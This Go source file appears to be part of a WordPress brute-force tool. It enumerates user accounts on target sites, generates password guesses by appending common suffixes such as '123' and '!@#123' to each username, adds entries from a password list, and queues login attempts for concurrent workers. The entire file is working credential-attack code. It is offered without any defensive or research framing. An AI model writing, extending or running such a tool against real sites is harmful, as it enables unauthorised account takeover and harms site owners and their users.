package module

import (
	"fmt"
	"io/ioutil"
	"log"
	"strings"
	"sync"
	"time"
)

var TaskQueue = make(chan SiteTask)
var SiteQueue = make(chan string)
var LogFile string
var lock sync.Mutex
var Wg = &sync.WaitGroup{}
var Rule = []string{
	"",
	"123",
	"@123",
	"12345",
	"123456",
	"@123456",
	"!@#123",
	"123!@#",
	"1",
	"111",
	"11",
	"2",
	"12",
	"22",
	"456",
	"345",
	"789",
	"13",
}

func ReadListToArray(f string, a *[]string) {
	if data, err := ioutil.ReadFile(f); err != nil {
		log.Println("file path is error ", err)
	} else {
		d := strings.Split(string(data), "\n")
		for _, p := range d {
			if p == "" {
				continue
			}
			p = strings.TrimSpace(p)
			*a = append(*a, p)
		}
	}
}

func NewWork(attackType string) {
	for {
		w := NewWpGo(attackType)
		select {
		case t := <-TaskQueue:
			//log.Println("Get Task ", t)
			w.Login(t)
		case <-time.After(30 * time.Second):
			Wg.Done()
			return
		}
	}
}
func NewSend(passlist []string, userlist []string, max int) {
	wp := NewWpGo("")
	for {
		select {
		case t := <-SiteQueue:
			user := BatchGetUser(wp, t, max)
			if len(userlist) > 0 {
				user = append(user, userlist...)
			}
			for _, u := range user {
				for _, rule := range Rule {
					tt := SiteTask{
						Host: t,
						User: u,
						Pass: fmt.Sprintf("%s%s", u, rule),
					}
					TaskQueue <- tt
				}
				for _, p := range passlist {
					tt := SiteTask{
						Host: t,
						User: u,
						Pass: p,
					}
					TaskQueue <- tt
				}
			}
		default:
			Wg.Done()
			return
		}
	}
}
func BatchGetUser(w *WpGo, host string, max int) []string {
	var users []string
	for i := 0; i < max; i++ {
		u := w.GetUser(host, i)
		if u != "" {
			users = append(users, u)
		}
	}
	return users
}
